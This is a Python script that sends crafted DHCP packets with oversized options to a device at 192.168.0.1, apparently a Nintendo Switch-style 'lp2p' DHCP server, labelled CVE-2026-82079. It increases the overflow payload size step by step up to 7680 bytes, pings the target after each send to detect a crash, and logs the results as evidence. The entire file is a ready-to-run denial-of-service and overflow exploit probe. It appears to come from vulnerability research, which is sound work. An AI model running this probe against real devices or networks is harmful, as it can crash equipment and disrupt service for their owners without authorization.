#!/usr/bin/env python3
"""
Direct lp2p DHCP overflow probe — bypasses alive check.
Sends crafted DHCP packets directly to 192.168.0.1:67.
"""

import socket
import struct
import random
import time
import json
import sys
import argparse
from pathlib import Path
from datetime import datetime, timezone

EVIDENCE_DIR = Path(__file__).parent.parent / "evidence" / "lp2p_dhcp"
SWITCH_IP = "192.168.0.1"


def get_iface_mac(iface):
    try:
        with open(f"/sys/class/net/{iface}/address") as f:
            return bytes(int(b, 16) for b in f.read().strip().split(":"))
    except Exception:
        return bytes([0x02] + [random.randint(0, 255) for _ in range(5)])


def build_dhcp(mac, msg_type=1, extra_options=b"", xid=None):
    if xid is None:
        xid = random.randint(0, 0xFFFFFFFF)
    pkt = struct.pack("!BBBB", 1, 1, 6, 0)
    pkt += struct.pack("!I", xid)
    pkt += struct.pack("!HH", 0, 0x8000)
    pkt += b"\x00" * 16
    pkt += mac + b"\x00" * 10
    pkt += b"\x00" * 64 + b"\x00" * 128
    pkt += b"\x63\x82\x53\x63"
    pkt += bytes([53, 1, msg_type])
    pkt += bytes([61, 7, 1]) + mac
    pkt += bytes([55, 4, 1, 3, 6, 28])
    pkt += extra_options
    pkt += bytes([255])
    return pkt, xid


def build_overflow_opts(total_size, fill=0x41):
    opts = b""
    remaining = total_size
    for code in [43, 60, 77, 12] + list(range(224, 255)):
        if remaining <= 2:
            break
        vlen = min(255, remaining - 2)
        opts += bytes([code, vlen]) + bytes([fill] * vlen)
        remaining -= (2 + vlen)
    return opts


def send_recv(iface, pkt, timeout=3, dest="255.255.255.255"):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.setsockopt(socket.SOL_SOCKET, 25, iface.encode())
    sock.settimeout(timeout)
    t0 = time.monotonic()
    try:
        sock.bind(("0.0.0.0", 68))
        sock.sendto(pkt, (dest, 67))
        try:
            data, addr = sock.recvfrom(4096)
            return data, time.monotonic() - t0
        except socket.timeout:
            return None, time.monotonic() - t0
    finally:
        sock.close()


def send_only(iface, pkt, dest="255.255.255.255"):
    """Send without waiting for response — for crash testing."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.setsockopt(socket.SOL_SOCKET, 25, iface.encode())
    try:
        sock.bind(("0.0.0.0", 0))
        sock.sendto(pkt, (dest, 67))
    finally:
        sock.close()


def parse_msg_type(data):
    cookie = data.find(b"\x63\x82\x53\x63")
    if cookie < 0:
        return "unknown"
    pos = cookie + 4
    while pos < len(data):
        if data[pos] == 255:
            break
        if data[pos] == 0:
            pos += 1
            continue
        if pos + 1 >= len(data):
            break
        ot, ol = data[pos], data[pos + 1]
        if ot == 53 and ol == 1 and pos + 2 < len(data):
            return {1: "DISCOVER", 2: "OFFER", 3: "REQUEST",
                    5: "ACK", 6: "NAK"}.get(data[pos + 2], f"type({data[pos + 2]})")
        pos += 2 + ol
    return "unknown"


def check_alive(iface, mac):
    """Quick check if Switch still responds to ping."""
    import subprocess
    r = subprocess.run(["ping", "-c", "1", "-W", "1", SWITCH_IP],
                       capture_output=True)
    return r.returncode == 0


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--iface", required=True)
    args = parser.parse_args()

    mac = get_iface_mac(args.iface)
    mac_s = ":".join(f"{b:02x}" for b in mac)

    print("=" * 60)
    print("  CVE-2026-82079 — Direct lp2p DHCP Overflow Probe")
    print("=" * 60)
    print(f"  Interface: {args.iface}")
    print(f"  MAC: {mac_s}")
    print(f"  Target: {SWITCH_IP}")
    print(f"  Time: {datetime.now(timezone.utc).isoformat()}")
    print("=" * 60)

    if not check_alive(args.iface, mac):
        print("  [!] Switch not reachable via ping")
        sys.exit(1)
    print("  [+] Switch reachable via ping")

    # First try a normal DHCP DISCOVER to see if server responds
    print("\n--- Baseline DHCP DISCOVER ---")
    pkt, xid = build_dhcp(mac, msg_type=1)
    print(f"  Sending {len(pkt)}B DISCOVER (xid={xid:#010x})...")

    # Try unicast first (we already have an IP)
    resp, elapsed = send_recv(args.iface, pkt, timeout=3, dest=SWITCH_IP)
    if resp:
        print(f"  [+] Got {parse_msg_type(resp)} in {elapsed:.3f}s (unicast)")
    else:
        # Try broadcast
        resp, elapsed = send_recv(args.iface, pkt, timeout=3)
        if resp:
            print(f"  [+] Got {parse_msg_type(resp)} in {elapsed:.3f}s (broadcast)")
        else:
            print(f"  [-] No DHCP response (server may not respond after initial lease)")
            print(f"      Switching to send-only + ping-alive mode")

    results = []

    # Phase 1: Exponential probe with increasing option sizes
    print("\n--- Phase 1: Exponential option size probe ---")
    sizes = [32, 64, 128, 256, 384, 448, 480, 496, 504, 508, 512, 516, 520, 528, 536, 544, 560, 576, 640, 768, 1024, 2048, 4096, 7680]

    for sz in sizes:
        if not check_alive(args.iface, mac):
            print(f"\n  [!!!] SWITCH DOWN after last packet!")
            print(f"        Waiting 15s for recovery...")
            time.sleep(15)
            if not check_alive(args.iface, mac):
                print(f"  [!!!] SWITCH NOT RECOVERING — CRASH CONFIRMED")
                results.append({"size": sz, "status": "target_down_no_recover"})
                break
            else:
                print(f"  [+] Switch recovered")
                results.append({"size": sz, "status": "recovered"})

        extra = build_overflow_opts(sz)
        pkt, xid = build_dhcp(mac, msg_type=1, extra_options=extra)

        # Try to get a response
        resp, elapsed = send_recv(args.iface, pkt, timeout=2, dest=SWITCH_IP)
        if resp is None:
            resp, elapsed = send_recv(args.iface, pkt, timeout=2)

        entry = {
            "target_bytes": sz,
            "actual_opt_bytes": len(extra),
            "pkt_bytes": len(pkt),
            "response": resp is not None,
            "elapsed": round(elapsed, 4),
        }

        if resp:
            mt = parse_msg_type(resp)
            entry["msg_type"] = mt
            print(f"  opts={len(extra):5d}B pkt={len(pkt):5d}B → {mt} ({elapsed:.3f}s)")
        else:
            # No response — check if crashed
            time.sleep(0.5)
            alive = check_alive(args.iface, mac)
            entry["ping_alive"] = alive
            if alive:
                print(f"  opts={len(extra):5d}B pkt={len(pkt):5d}B → no DHCP resp, ping OK")
            else:
                entry["possible_crash"] = True
                print(f"  opts={len(extra):5d}B pkt={len(pkt):5d}B → NO RESPONSE + PING DEAD!")
                print(f"  [!!!] POSSIBLE CRASH — waiting 15s...")
                time.sleep(15)
                alive2 = check_alive(args.iface, mac)
                entry["recovered"] = alive2
                if alive2:
                    print(f"  [+] Switch recovered after 15s")
                else:
                    print(f"  [!!!] SWITCH NOT RECOVERING — CRASH AT {len(extra)}B OPTIONS")
                    results.append(entry)
                    break

        results.append(entry)
        time.sleep(0.3)

    # Save results
    EVIDENCE_DIR.mkdir(parents=True, exist_ok=True)
    summary = {
        "test": "direct_overflow_probe",
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "target": f"{SWITCH_IP} lp2p DHCP server",
        "cve": "CVE-2026-82079",
        "mac": mac_s,
        "results": results,
    }
    path = EVIDENCE_DIR / "direct_probe.json"
    with open(path, "w") as f:
        json.dump(summary, f, indent=2, default=str)
    print(f"\n  Evidence saved: {path}")

    # Summary
    print("\n" + "=" * 60)
    crashes = [r for r in results if r.get("possible_crash")]
    if crashes:
        print(f"  CRASHES DETECTED: {len(crashes)}")
        for c in crashes:
            print(f"    at opts={c['actual_opt_bytes']}B, recovered={c.get('recovered', '?')}")
    else:
        print(f"  No crashes detected in {len(results)} tests")
    print("=" * 60)


if __name__ == "__main__":
    main()
